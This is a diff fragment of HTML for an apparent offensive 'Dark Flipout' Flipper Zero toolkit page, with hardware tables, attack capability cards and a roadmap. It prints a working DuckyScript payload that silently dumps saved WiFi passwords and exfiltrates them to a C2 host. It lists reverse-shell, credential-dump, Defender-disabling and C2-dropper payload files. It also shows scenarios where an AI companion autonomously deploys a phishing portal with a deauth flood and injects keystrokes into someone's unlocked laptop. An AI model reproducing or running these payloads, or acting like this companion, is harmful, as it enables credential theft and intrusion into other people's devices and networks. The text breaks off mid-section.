+                <tr><td>RGB Backlight Support</td><td class="fw-cross">✗</td><td class="fw-winner fw-check">✓</td><td class="fw-check">✓</td><td class="fw-check">✓</td></tr>
+                <tr><td>Active Maintenance</td><td class="fw-check">✓</td><td class="fw-winner fw-check">✓</td><td class="fw-check">✓</td><td class="fw-cross">~</td></tr>
+            </tbody>
+        </table>
+        </div>
+    </section>
+
+    <!-- HARDWARE -->
+    <section class="section" id="hardware">
+        <div class="section-header">
+            <div class="section-number">04</div>
+            <div class="section-title">Hardware Stack</div>
+            <div class="section-line"></div>
+        </div>
+
+        <!-- ARCHITECTURE DIAGRAM -->
+        <div class="arch-diagram" style="margin-bottom: 25px;">
+            <div class="arch-layer">
+                <div class="arch-layer-title">// FLIPPER ZERO BASE UNIT //</div>
+                <div class="arch-layer-items">
+                    <span class="arch-item">STM32WB55 MCU</span>
+                    <span class="arch-item">Sub-GHz CC1101</span>
+                    <span class="arch-item">NFC ST25R3916</span>
+                    <span class="arch-item">125kHz RFID</span>
+                    <span class="arch-item">IR Rx/Tx</span>
+                    <span class="arch-item">BLE 5.0</span>
+                    <span class="arch-item">iButton</span>
+                    <span class="arch-item">USB-C HID</span>
+                    <span class="arch-item">GPIO Header</span>
+                </div>
+            </div>
+            <div class="arch-connector">↕ GPIO EXPANSION ↕</div>
+            <div class="arch-layer">
+                <div class="arch-layer-title">// MAYHEM v2 ALL-IN-ONE EXPANSION //</div>
+                <div class="arch-layer-items">
+                    <span class="arch-item">ESP32-S WiFi</span>
+                    <span class="arch-item">BLE 4.2</span>
+                    <span class="arch-item">OV2640 2MP Camera</span>
+                    <span class="arch-item">NRF24L01 2.4GHz</span>
+                    <span class="arch-item">CC1101 433MHz</span>
+                    <span class="arch-item">MicroSD</span>
+                    <span class="arch-item">LED Flashlight</span>
+                    <span class="arch-item">u.FL Antenna</span>
+                </div>
+            </div>
+            <div class="arch-connector">↕ FIRMWARE ↕</div>
+            <div class="arch-layer">
+                <div class="arch-layer-title">// ESP32 MARAUDER FIRMWARE //</div>
+                <div class="arch-layer-items">
+                    <span class="arch-item">WiFi Scan/Attack</span>
+                    <span class="arch-item">Deauth Flood</span>
+                    <span class="arch-item">Evil Portal</span>
+                    <span class="arch-item">PMKID Sniff</span>
+                    <span class="arch-item">BLE Attacks</span>
+                    <span class="arch-item">Wardrive+GPS</span>
+                    <span class="arch-item">PCAP Dump</span>
+                    <span class="arch-item">Karma</span>
+                </div>
+            </div>
+            <div class="arch-connector">↕ USB / SERIAL ↕</div>
+            <div class="arch-layer">
+                <div class="arch-layer-title">// DARK FLIPOUT COMPANION — ROG STRIX G17 + RTX 4060 //</div>
+                <div class="arch-layer-items">
+                    <span class="arch-item">pyFlipper Bridge</span>
+                    <span class="arch-item">PCAP Analyzer</span>
+                    <span class="arch-item">hashcat GPU</span>
+                    <span class="arch-item">AI Planner</span>
+                    <span class="arch-item">Wardrive Map</span>
+                    <span class="arch-item">10k+ Tools</span>
+                    <span class="arch-item">V3SP3R Bridge</span>
+                    <span class="arch-item">Report Engine</span>
+                </div>
+            </div>
+        </div>
+
+        <div style="overflow-x: auto;">
+        <table class="hw-table">
+            <thead>
+                <tr>
+                    <th>Component</th>
+                    <th>Purpose</th>
+                    <th>Status</th>
+                    <th>Cost</th>
+                    <th>Source</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td class="name">Flipper Zero</td><td>Base unit — all RF protocols</td><td class="status-active">✓ CORE</td><td class="price">~$169</td><td>flipper.net</td></tr>
+                <tr><td class="name">Mayhem v2 Deluxe</td><td>ESP32+WiFi+Camera+NRF24+CC1101</td><td class="status-active">✓ CORE</td><td class="price">~$165</td><td>Tindie (eried)</td></tr>
+                <tr><td class="name">External CC1101 Board</td><td>Sub-GHz range boost</td><td class="status-active">✓ CORE</td><td class="price">~$25</td><td>Amazon</td></tr>
+                <tr><td class="name">GPS Module (Serial)</td><td>Wardriving / Subdriving</td><td class="status-active">✓ CORE</td><td class="price">~$10</td><td>AliExpress</td></tr>
+                <tr><td class="name">64GB MicroSD</td><td>PCAP/payload/database storage</td><td class="status-active">✓ CORE</td><td class="price">~$12</td><td>Amazon</td></tr>
+                <tr><td class="name">RGB Backlight Kit</td><td>Visual identity + aesthetics</td><td class="status-optional">⚡ MOD</td><td class="price">~$15</td><td>GitHub (quen0n)</td></tr>
+                <tr><td class="name">Ultimate 3D Case</td><td>House all expansion modules</td><td class="status-optional">⚡ MOD</td><td class="price">~$10 print</td><td>Printables</td></tr>
+                <tr><td class="name">CAN Bus Module</td><td>Automotive CAN sniffing</td><td class="status-optional">◎ FUTURE</td><td class="price">~$35</td><td>GitHub</td></tr>
+                <tr><td class="name">Mentra Smart Glasses</td><td>Hands-free V3SP3R AI control</td><td class="status-optional">◎ FUTURE</td><td class="price">TBD</td><td>mentraglass.com</td></tr>
+            </tbody>
+        </table>
+        </div>
+    </section>
+
+    <!-- CAPABILITIES -->
+    <section class="section" id="capabilities">
+        <div class="section-header">
+            <div class="section-number">05</div>
+            <div class="section-title">Capability Matrix</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="grid-3">
+            <div class="card">
+                <div class="card-icon">📡</div>
+                <div class="card-title">Sub-GHz RF</div>
+                <div class="card-body">300–928MHz fully unlocked. Rolling code capture/replay. OOK brute force. TouchTune jukebox control. Restaurant pager triggers. GPS-tagged subdriving. Spectrum analyzer. CC1101 external antenna for max range.</div>
+                <div style="margin-top: 12px;">
+                    <span class="card-tag">CAPTURE</span>
+                    <span class="card-tag">REPLAY</span>
+                    <span class="card-tag">BRUTEFORCE</span>
+                    <span class="card-tag">WARDRIVE</span>
+                </div>
+            </div>
+            <div class="card cyan">
+                <div class="card-icon">📶</div>
+                <div class="card-title">WiFi (Marauder)</div>
+                <div class="card-body">Full AP/client enumeration. PMKID/EAPOL capture → GPU crack. Deauth flood. Evil Portal phishing. Karma rogue AP. Beacon spam. GPS-tagged wardrive with PCAP dumps. Network scanning suite.</div>
+                <div style="margin-top: 12px;">
+                    <span class="card-tag cyan">DEAUTH</span>
+                    <span class="card-tag cyan">EVIL PORTAL</span>
+                    <span class="card-tag cyan">PMKID</span>
+                    <span class="card-tag cyan">WARDRIVE</span>
+                </div>
+            </div>
+            <div class="card green">
+                <div class="card-icon">🦷</div>
+                <div class="card-title">Bluetooth</div>
+                <div class="card-body">BLE device enumeration. Apple/Android/Samsung/Windows BLE spam. Airtag spoof+sniff. Bluetooth wardrive. BadKB wireless HID injection (NO USB needed). Card skimmer detection. Meta device sniffing.</div>
+                <div style="margin-top: 12px;">
+                    <span class="card-tag green">SPAM</span>
+                    <span class="card-tag green">BADK B</span>
+                    <span class="card-tag green">WARDRIVE</span>
+                    <span class="card-tag green">SKIMMER</span>
+                </div>
+            </div>
+            <div class="card yellow">
+                <div class="card-icon">💳</div>
+                <div class="card-title">NFC / RFID</div>
+                <div class="card-body">NFC-A/B/F/V read/write/emulate. Mifare Classic crack + emulate. NTAG operations. EMV card data. Access control card clone. Amiibo vault. Universal intercom keys. 125kHz LF full coverage.</div>
+                <div style="margin-top: 12px;">
+                    <span class="card-tag yellow">READ</span>
+                    <span class="card-tag yellow">CLONE</span>
+                    <span class="card-tag yellow">EMULATE</span>
+                    <span class="card-tag yellow">CRACK</span>
+                </div>
+            </div>
+            <div class="card purple">
+                <div class="card-icon">⌨️</div>
+                <div class="card-title">HID Injection</div>
+                <div class="card-body">BadUSB (USB wired) + BadKB (BT wireless). Full DuckyScript support. Reverse shells, credential dump, persistence, vuln scan, WiFi password exfil, Chrome dump, SAM dump, C2 dropper. Works on Windows, Linux, Mac.</div>
+                <div style="margin-top: 12px;">
+                    <span class="card-tag purple">REVSHELL</span>
+                    <span class="card-tag purple">CREDS</span>
+                    <span class="card-tag purple">PERSIST</span>
+                    <span class="card-tag purple">WIRELESS</span>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-icon">📷</div>
+                <div class="card-title">Camera + NRF24</div>
+                <div class="card-body">2MP OV2640 camera: motion detection, QR reading, visual recon, nanny cam, AI multimodal input feed. NRF24L01: mousejacking (wireless HID hijack), Nordic protocol attacks, drone RC sniffing.</div>
+                <div style="margin-top: 12px;">
+                    <span class="card-tag">CAMERA</span>
+                    <span class="card-tag">MOUSEJACK</span>
+                    <span class="card-tag">AI INPUT</span>
+                    <span class="card-tag">DRONE</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- AI LAYER -->
+    <section class="section" id="ai">
+        <div class="section-header">
+            <div class="section-number">06</div>
+            <div class="section-title">AI / Autonomous Layer</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="highlight-box cyan">
+            <p><strong class="glow-cyan">V3SP3R (Vesper)</strong> — Real production AI companion for Flipper Zero (released March 2026). Android app + OpenRouter AI models + Flipper serial bridge = natural language autonomous hacking platform. Multimodal: text, voice, camera. Risk-classified operations. Audit log. Smart glasses integration for hands-free ops.</p>
+        </div>
+
+        <div class="grid-2" style="margin-top: 25px;">
+            <div>
+                <div class="ai-scenario">
+                    <div class="ai-scenario-title">// SCENARIO 01 — PHYSICAL ACCESS ASSESSMENT //</div>
+                    <div class="ai-scenario-body">
+                        <div style="color: var(--cyan); margin-bottom: 10px; font-size: 0.85rem;">User: "Assess the access control systems in this lobby"</div>
+                        <div class="ai-step"><div class="ai-step-num">01</div><div class="ai-step-text">AI activates 125kHz RFID scan → captures nearby card UIDs</div></div>
+                        <div class="ai-step"><div class="ai-step-num">02</div><div class="ai-step-text">Activates NFC scan → reads 13.56MHz card data</div></div>
+                        <div class="ai-step"><div class="ai-step-num">03</div><div class="ai-step-text">Camera analyzes reader hardware → identifies model</div></div>
+                        <div class="ai-step"><div class="ai-step-num">04</div><div class="ai-step-text">Reports card format, system type, vulnerabilities</div></div>
+                        <div class="ai-step"><div class="ai-step-num">05</div><div class="ai-step-text">Proposes emulation test → awaits approval</div></div>
+                    </div>
+                </div>
+                <div class="ai-scenario">
+                    <div class="ai-scenario-title">// SCENARIO 02 — FULL WIRELESS RECON //</div>
+                    <div class="ai-scenario-body">
+                        <div style="color: var(--cyan); margin-bottom: 10px; font-size: 0.85rem;">User: "Full wireless recon of this environment"</div>
+                        <div class="ai-step"><div class="ai-step-num">01</div><div class="ai-step-text">Marauder AP scan → all networks enumerated</div></div>
+                        <div class="ai-step"><div class="ai-step-num">02</div><div class="ai-step-text">PMKID capture on all WPA2 targets</div></div>
+                        <div class="ai-step"><div class="ai-step-num">03</div><div class="ai-step-text">BLE wardrive → all BLE devices mapped</div></div>
+                        <div class="ai-step"><div class="ai-step-num">04</div><div class="ai-step-text">Sub-GHz spectrum sweep logged</div></div>
+                        <div class="ai-step"><div class="ai-step-num">05</div><div class="ai-step-text">All data → SD card → companion for GPU cracking</div></div>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <div class="ai-scenario">
+                    <div class="ai-scenario-title">// SCENARIO 03 — EVIL PORTAL DEPLOY //</div>
+                    <div class="ai-scenario-body">
+                        <div style="color: var(--cyan); margin-bottom: 10px; font-size: 0.85rem;">User: "Deploy phishing portal for WPA2 capture"</div>
+                        <div class="ai-step"><div class="ai-step-num">01</div><div class="ai-step-text">AI selects target AP from scan results</div></div>
+                        <div class="ai-step"><div class="ai-step-num">02</div><div class="ai-step-text">Clones SSID → deploys Evil Portal HTML</div></div>
+                        <div class="ai-step"><div class="ai-step-num">03</div><div class="ai-step-text">Activates deauth flood on target AP</div></div>
+                        <div class="ai-step"><div class="ai-step-num">04</div><div class="ai-step-text">Captures credentials from captive portal</div></div>
+                        <div class="ai-step"><div class="ai-step-num">05</div><div class="ai-step-text">Exports to companion → structured report</div></div>
+                    </div>
+                </div>
+                <div class="ai-scenario">
+                    <div class="ai-scenario-title">// SCENARIO 04 — WIRELESS HID INJECTION //</div>
+                    <div class="ai-scenario-body">
+                        <div style="color: var(--cyan); margin-bottom: 10px; font-size: 0.85rem;">User: "Run vuln scan on that unlocked laptop"</div>
+                        <div class="ai-step"><div class="ai-step-num">01</div><div class="ai-step-text">AI activates BadKB Bluetooth HID mode</div></div>
+                        <div class="ai-step"><div class="ai-step-num">02</div><div class="ai-step-text">Pairs as wireless keyboard — NO USB cable</div></div>
+                        <div class="ai-step"><div class="ai-step-num">03</div><div class="ai-step-text">Executes DF_VulnScan DuckyScript payload</div></div>
+                        <div class="ai-step"><div class="ai-step-num">04</div><div class="ai-step-text">Exfiltrates results via BLE callback</div></div>
+                        <div class="ai-step"><div class="ai-step-num">05</div><div class="ai-step-text">AI generates vulnerability report</div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- SCRIPTS -->
+    <section class="section" id="scripts">
+        <div class="section-header">
+            <div class="section-number">07</div>
+            <div class="section-title">Script Framework + SD Layout</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="grid-2">
+            <div>
+                <div class="card-title" style="margin-bottom: 15px; font-family: 'Orbitron', sans-serif; font-size: 0.85rem; letter-spacing: 2px;">SD CARD LAYOUT</div>
+                <div class="sd-tree">
+<span class="sd-root">📁 /SD CARD ROOT</span>
+├── <span class="sd-dir">📂 badusb/DarkFlipout/</span>
+│   ├── <span class="sd-file">DF_VulnScan.txt</span>
+│   ├── <span class="sd-file">DF_RevShell_PS.txt</span>
+│   ├── <span class="sd-file">DF_RevShell_Bash.txt</span>
+│   ├── <span class="sd-file">DF_WifiDump_Win.txt</span>
+│   ├── <span class="sd-file">DF_WifiDump_Lin.txt</span>
+│   ├── <span class="sd-file">DF_ChromeDump.txt</span>
+│   ├── <span class="sd-file">DF_PersistenceWin.txt</span>
+│   ├── <span class="sd-file">DF_SAM_Dump.txt</span>
+│   ├── <span class="sd-file">DF_DisableDefender.txt</span>
+│   ├── <span class="sd-file">DF_EvilTwin_Setup.txt</span>
+│   └── <span class="sd-file">DF_C2_Dropper.txt</span>
+├── <span class="sd-dir">📂 subghz/DarkFlipout/</span>
+│   ├── <span class="sd-dir">bruteforce/</span>     (OOK files)
+│   ├── <span class="sd-dir">captures/</span>       (field captures)
+│   └── <span class="sd-dir">known_devices/</span>  (signal library)
+├── <span class="sd-dir">📂 nfc/DarkFlipout/</span>
+│   ├── <span class="sd-dir">amiibo/</span>         (full vault)
+│   ├── <span class="sd-dir">access_cards/</span>   (captures)
+│   └── <span class="sd-dir">emulation/</span>
+├── <span class="sd-dir">📂 rfid/DarkFlipout/</span>
+│   ├── <span class="sd-dir">intercom_keys/</span>  (universal)
+│   └── <span class="sd-dir">captures/</span>
+├── <span class="sd-dir">📂 infrared/DarkFlipout/</span>
+│   ├── <span class="sd-dir">universal/</span>      (IRDB full)
+│   └── <span class="sd-dir">captures/</span>
+└── <span class="sd-dir">📂 apps/evil_portal/</span>
+    ├── <span class="sd-file">df_router_portal.html</span>
+    ├── <span class="sd-file">df_corp_portal.html</span>
+    └── <span class="sd-file">df_generic_portal.html</span>
+                </div>
+            </div>
+            <div>
+                <div class="card-title" style="margin-bottom: 15px; font-family: 'Orbitron', sans-serif; font-size: 0.85rem; letter-spacing: 2px;">SAMPLE PAYLOAD — DF_WifiDump_Win.txt</div>
+                <div class="terminal">
+<span class="output">REM Dark Flipout - WiFi Password Dumper</span>
+<span class="output">REM Target: Windows | Exfil: HTTP</span>
+<span class="output">REM No visible window, runs silently</span>
+<br>
+<span class="prompt">DELAY</span> <span class="cmd">500</span>
+<span class="prompt">GUI</span> <span class="cmd">r</span>
+<span class="prompt">DELAY</span> <span class="cmd">400</span>
+<span class="prompt">STRING</span> <span class="cmd">powershell -w hidden -ep bypass</span>
+<span class="prompt">ENTER</span>
+<span class="prompt">DELAY</span> <span class="cmd">800</span>
+<span class="prompt">STRING</span> <span class="cmd">$w=(netsh wlan show profiles)|</span>
+<span class="prompt">STRING</span> <span class="cmd">  Select-String "Profile";</span>
+<span class="prompt">STRING</span> <span class="cmd">$r=$w|%{$n=($_ -split ": ")[1];</span>
+<span class="prompt">STRING</span> <span class="cmd">  $p=netsh wlan show profile</span>
+<span class="prompt">STRING</span> <span class="cmd">  name=$n key=clear;</span>
+<span class="prompt">STRING</span> <span class="cmd">  "$n : $p"};</span>
+<span class="prompt">STRING</span> <span class="cmd">Invoke-WebRequest -Uri</span>
+<span class="prompt">STRING</span> <span class="cmd">  "http://C2IP/dump" -Method POST</span>
+<span class="prompt">STRING</span> <span class="cmd">  -Body ($r|ConvertTo-Json)</span>
+<span class="prompt">ENTER</span>
+<br>
+<span class="success">// SILENT. NO WINDOW. EXFILS IN ~3 SECONDS //</span>
+                </div>
+
+                <div class="card-title" style="margin-top: 20px; margin-bottom: 15px; font-family: 'Orbitron', sans-serif; font-size: 0.85rem; letter-spacing: 2px;">10k+ TOOL INTEGRATION MENU</div>
+                <div class="terminal">
+<span class="output">[DARK FLIPOUT - FLIPPER ZERO OPS]</span>
+<span class="prompt">[DF01]</span> <span class="cmd">Launch Companion GUI</span>
+<span class="prompt">[DF02]</span> <span class="cmd">Sync Flipper SD Card</span>
+<span class="prompt">[DF03]</span> <span class="cmd">Deploy BadUSB Payload</span>
+<span class="prompt">[DF04]</span> <span class="cmd">Analyze Captured PCAP</span>
+<span class="prompt">[DF05]</span> <span class="cmd">Crack WPA2 Hash (RTX 4060)</span>
+<span class="prompt">[DF06]</span> <span class="cmd">Generate Evil Portal</span>
+<span class="prompt">[DF07]</span> <span class="cmd">View Wardrive Map</span>
+<span class="prompt">[DF08]</span> <span class="cmd">NFC/RFID Database Ops</span>
+<span class="prompt">[DF09]</span> <span class="cmd">Update All Databases</span>
+<span class="prompt">[DF10]</span> <span class="cmd">AI Attack Planner</span>
+<span class="prompt">[DF11]</span> <span class="cmd">Generate Pentest Report</span>
+<span class="prompt">[DF12]</span> <span class="cmd">Flash Firmware (Momentum)</span>
+<span class="prompt">[DF13]</span> <span class="cmd">Manage SD Card Layout</span>
+<span class="warn">→ Select option: _</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- COMPANION -->
+    <section class="section" id="companion">
+        <div class="section-header">
+            <div class="section-number">08</div>
+            <div class="section-title">Dark Flipout Companion</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="companion-mock">
+            <div class="companion-titlebar">
+                <div class="companion-title">🖤 DARK FLIPOUT COMPANION v1.0 — ROG STRIX G17</div>
+                <div class="companion-dots">
+                    <div class="companion-dot red"></div>
+                    <div class="companion-dot yellow"></div>
+                    <div class="companion-dot green"></div>
+                </div>
+            </div>
+            <div class="companion-body">
+                <div class="companion-line">
+                    <span class="p">[DF]</span>
+                    <span class="o">Flipper Zero detected on /dev/ttyACM0 — CONNECTED</span>
+                </div>
+                <div class="companion-line">
+                    <span class="p">[DF]</span>
+                    <span class="o">Firmware: Momentum v0.9.X | Battery: 87% | SD: 41.2GB free</span>
+                </div>
+                <div class="companion-line">
+                    <span class="p">[DF]</span>
+                    <span class="o">ESP32 Marauder: ONLINE | GPS: LOCKED (12 sats)</span>
+                </div>
+                <div class="companion-line">
+                    <span class="p">[DF]</span>
+                    <span class="o">V3SP3R AI: CONNECTED (Claude Sonnet via OpenRouter)</span>
+                </div>
+                <div class="companion-line">
+                    <span class="success">[OK]</span>
+                    <span class="o">All systems nominal. Dark Flipout ready.</span>
+                </div>
+                <div class="companion-menu">
+                    <div class="companion-menu-item"><span class="num">[1]</span> Flipper Zero Serial Bridge</div>
+                    <div class="companion-menu-item"><span class="num">[2]</span> PCAP Analyzer → hashcat Pipeline</div>
+                    <div class="companion-menu-item"><span class="num">[3]</span> Sub-GHz Signal Analyzer</div>
+                    <div class="companion-menu-item active"><span class="num">[4]</span> BadUSB Payload Generator (AI) ← ACTIVE</div>
+                    <div class="companion-menu-item"><span class="num">[5]</span> Evil Portal Manager</div>
+                    <div class="companion-menu-item"><span class="num">[6]</span> NFC/RFID Database Manager</div>
+                    <div class="companion-menu-item"><span class="num">[7]</span> Wardrive Map Viewer (Folium)</div>
+                    <div class="companion-menu-item"><span class="num">[8]</span> WPA2 Hash Cracker (RTX 4060)</div>
+                    <div class="companion-menu-item"><span class="num">[9]</span> BLE Device Database</div>
+                    <div class="companion-menu-item"><span class="num">[10]</span> AI Attack Planner (V3SP3R)</div>
+                    <div class="companion-menu-item"><span class="num">[11]</span> Report Generator</div>
+                    <div class="companion-menu-item"><span class="num">[12]</span> Update All Databases</div>
+                </div>
+                <div class="companion-line" style="margin-top: 15px;">
+                    <span class="w">[AI]</span>
+                    <span class="o">Generating BadUSB payload: target=Windows, obj=cred_dump, exfil=https</span>
+                </div>
+                <div class="companion-line">
+                    <span class="success">[OK]</span>
+                    <span class="h">DF_ChromeDump_v2.txt generated → syncing to Flipper SD...</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ATTACK MAP -->
+    <section class="section" id="attackmap">
+        <div class="section-header">
+            <div class="section-number">09</div>
+            <div class="section-title">Attack Domain Map</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="attack-tree">
+<div class="attack-domain">◈ PHYSICAL ACCESS</div>
+<div class="attack-sub">├── RFID/NFC</div>
+<div class="attack-item">│   ├── 125kHz card read → clone → emulate</div>
+<div class="attack-item">│   ├── 13.56MHz Mifare crack → emulate</div>
+<div class="attack-item">│   └── Universal intercom keys</div>
+<div class="attack-sub">├── Hardware</div>
+<div class="attack-item">│   ├── Sentry Safe / Master Lock bypass</div>
+<div class="attack-item">│   └── iButton emulation</div>
+<div class="attack-sub">└── Camera-assisted recon (Mayhem v2)</div>
+<br>
+<div class="attack-domain">◈ RF / WIRELESS</div>
+<div class="attack-sub">├── Sub-GHz (300-928MHz w/ CC1101)</div>
+<div class="attack-item">│   ├── Garage/gate/barrier capture+replay</div>
+<div class="attack-item">│   ├── Key fob signal analysis</div>
+<div class="attack-item">│   ├── OOK brute force attacks</div>
+<div class="attack-item">│   └── GPS-tagged subdriving</div>
+<div class="attack-sub">├── 2.4GHz (NRF24L01)</div>
+<div class="attack-item">│   ├── Wireless keyboard/mouse hijack (Mousejacking)</div>
+<div class="attack-item">│   ├── Nordic Semiconductor protocol attacks</div>
+<div class="attack-item">│   └── Drone RC protocol sniff/replay</div>
+<div class="attack-sub">└── Infrared (38kHz)</div>
+<div class="attack-item">    ├── Universal remote chaos (10k+ devices)</div>
+<div class="attack-item">    └── Custom IR signal capture/replay</div>
+<br>
+<div class="attack-domain">◈ WIFI (ESP32 MARAUDER)</div>
+<div class="attack-sub">├── Recon</div>
+<div class="attack-item">│   ├── AP/client full enumeration</div>
+<div class="attack-item">│   ├── PMKID/EAPOL hash capture → GPU crack</div>
+<div class="attack-item">│   ├── Probe request device intelligence</div>
+<div class="attack-item">│   └── GPS-tagged wardrive → PCAP dump</div>
+<div class="attack-sub">├── Attacks</div>
+<div class="attack-item">│   ├── Deauth flood (targeted/broadcast)</div>
+<div class="attack-item">│   ├── Evil Portal (captive portal phish)</div>
+<div class="attack-item">│   ├── Karma attack (rogue AP)</div>
+<div class="attack-item">│   ├── Beacon spam (noise/confusion/clone)</div>
+<div class="attack-item">│   └── SAE Commit Flood (WPA3)</div>
+<div class="attack-sub">└── Network Scan</div>
+<div class="attack-item">    ├── Ping/ARP/Port scan</div>
+<div class="attack-item">    └── SSH/Telnet service enum</div>
+<br>
+<div class="attack-domain">◈ BLUETOOTH</div>
+<div class="attack-sub">├── BLE Attacks</div>
+<div class="attack-item">│   ├── Apple Sour Apple (device DoS)</div>
+<div class="attack-item">│   ├── Samsung/Android/Windows BLE spam</div>
+<div class="attack-item">│   └── Airtag spoof (covert tracking)</div>
+<div class="attack-sub">├── BadKB (Wireless HID — NO USB)</div>
+<div class="attack-item">│   ├── Pairs as Bluetooth keyboard (~10m range)</div>
+<div class="attack-item">│   └── All BadUSB payloads work wirelessly</div>
+<div class="attack-sub">└── Intelligence</div>
+<div class="attack-item">    ├── BLE device wardrive (GPS-tagged)</div>
+<div class="attack-item">    └── Card skimmer detection</div>
+<br>
+<div class="attack-domain">◈ HID INJECTION (BadUSB + BadKB)</div>
+<div class="attack-item">├── DF_RevShell_PS.txt    → PowerShell reverse shell</div>
+<div class="attack-item">├── DF_WifiDump_Win.txt   → WiFi password exfil</div>
+<div class="attack-item">├── DF_ChromeDump.txt     → Browser cred dump</div>
+<div class="attack-item">├── DF_PersistenceWin.txt → Multi-method persistence</div>
+<div class="attack-item">├── DF_SAM_Dump.txt       → Windows SAM extract</div>
+<div class="attack-item">├── DF_VulnScan.txt       → Full vuln assessment</div>
+<div class="attack-item">└── DF_C2_Dropper.txt     → C2 stager deploy</div>
+<br>
+<div class="attack-domain">◈ AI / AUTONOMOUS</div>
+<div class="attack-item">├── Natural language → full attack execution</div>
+<div class="attack-item">├── Multimodal input (text/voice/camera)</div>
+<div class="attack-item">├── Risk-classified approval gates</div>
+<div class="attack-item">├── Autonomous attack chain scenarios</div>
+<div class="attack-item">└── Structured finding reports</div>
+        </div>
+    </section>
+
+    <!-- ROADMAP -->
+    <section class="section" id="roadmap">
+        <div class="section-header">
+            <div class="section-number">10</div>
+            <div class="section-title">Development Roadmap</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="roadmap-item">
+            <div class="roadmap-sprint">SPRINT 1<br>Week 1-2</div>
+            <div class="roadmap-content">
+                <div class="roadmap-title">FOUNDATION</div>
+                <ul class="roadmap-tasks">
+                    <li>Flash Momentum firmware + full configuration</li>
+                    <li>Load all databases to SD card (IRDB, Amiibo, BadUSB, Sub-GHz)</li>
+                    <li>Set up pyFlipper serial bridge on ROG Strix</li>
+                    <li>Build Dark Flipout Companion script (Lazy Script GUI)</li>
+                    <li>Integrate DF menu into existing 10k+ tool script</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="roadmap-item">
+            <div class="roadmap-sprint">SPRINT 2<br>Week 3-4</div>
+            <div class="roadmap-content">
+                <div class="roadmap-title">MARAUDER INTEGRATION</div>
+                <ul class="roadmap-tasks">
+                    <li>Flash ESP32 Marauder on WiFi dev board</li>
+                    <li>Build PCAP auto-ingestion pipeline</li>
+                    <li>Integrate hashcat with RTX 4060 for WPA2 cracking</li>
+                    <li>Build wardrive map viewer (Folium/Leaflet)</li>
+                    <li>Test full WiFi attack chain end-to-end</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="roadmap-item">
+            <div class="roadmap-sprint">SPRINT 3<br>Week 5-6</div>
+            <div class="roadmap-content">
+                <div class="roadmap-title">MAYHEM v2 + HARDWARE</div>
+                <ul class="roadmap-tasks">
+                    <li>Build/receive Mayhem v2 Deluxe Ultimate</li>
+                    <li>Configure ESP32-S + NRF24 + CC1101 + Camera</li>
+                    <li>Test mousejacking + drone sniffing</li>
+                    <li>Camera → AI multimodal pipeline test</li>
+                    <li>Build 3D printed ultimate case</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="roadmap-item">
+            <div class="roadmap-sprint">SPRINT 4<br>Week 7-8</div>
+            <div class="roadmap-content">
+                <div class="roadmap-title">AI LAYER (V3SP3R)</div>
+                <ul class="roadmap-tasks">
+                    <li>Deploy V3SP3R on Android companion device</li>
+                    <li>Configure Dark Flipout custom system prompt</li>
+                    <li>Test all 5 autonomous scenarios</li>
+                    <li>Build AI attack planner in companion script</li>
+                    <li>AI-powered BadUSB payload generator</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="roadmap-item">
+            <div class="roadmap-sprint">SPRINT 5<br>Week 9-10</div>
+            <div class="roadmap-content">
+                <div class="roadmap-title">CUSTOM SCRIPTS</div>
+                <ul class="roadmap-tasks">
+                    <li>Write all custom BadUSB/BadKB payloads</li>
+                    <li>Build Evil Portal template library</li>
+                    <li>Write DuckyScript automation tools</li>
+                    <li>Build reporting engine (structured findings)</li>
+                    <li>Full integration testing across all modules</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="roadmap-item">
+            <div class="roadmap-sprint">SPRINT 6<br>Ongoing</div>
+            <div class="roadmap-content">
+                <div class="roadmap-title">ADVANCED FEATURES</div>
+                <ul class="roadmap-tasks">
+                    <li>CAN bus module integration (automotive)</li>
+                    <li>Custom Flipper app development in C (FBT)</li>
+                    <li>Meshtastic off-grid comms integration</li>
+                    <li>Custom firmware patches</li>
+                    <li>Expand AI autonomous scenario library</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════════
+         SECTION 11 — MARAUDER 4-ANTENNA BEAST
+         ═══════════════════════════════════════════════════════════ -->
+    <section class="section" id="marauder">
+        <div class="section-header">
+            <div class="section-number">11</div>
+            <div class="section-title">Marauder 4-Antenna Beast — Modules DF13–DF18</div>
+            <div class="section-line"></div>
+        </div>
+
+        <!-- HARDWARE SPEC BANNER -->
+        <div class="terminal" style="margin-bottom:30px; border-color: var(--red);">
+<span class="success">╔══════════════════════════════════════════════════════════════════════╗</span>
+<span class="success">║   ESP32 MARAUDER — 4-ANTENNA CONFIGURATION — DARK FLIPOUT EDITION   ║</span>
+<span class="success">╚══════════════════════════════════════════════════════════════════════╝</span>
+<span class="output">  Antenna 1 (ANT-A): 2.4GHz WiFi #1  — Primary Scan / Deauth / PMKID</span>
+<span class="output">  Antenna 2 (ANT-B): 2.4GHz WiFi #2  — Evil AP / Karma / Beacon Spam</span>
+<span class="output">  Antenna 3 (ANT-C): 433MHz CC1101   — Sub-GHz OOK/FSK Capture+Replay</span>
+<span class="output">  Antenna 4 (ANT-D): GPS (u-blox)    — Live Coord Lock / Wardrive Tags</span>
+<span class="output">  Display  : 2" Touch TFT (320x240)  — Standalone UI / GPIO Hookup</span>
+<span class="output">  Storage  : microSD Slot             — PCAP / .sub / BLE DB / Logs</span>
+<span class="output">  Buttons  : A / B / C / D            — Shortcut Attack Triggers</span>
+<span class="warn">  Power    : USB-C 5V / LiPo 3.7V    — 8-12h field runtime</span>
+        </div>
+
+        <div class="grid-2">
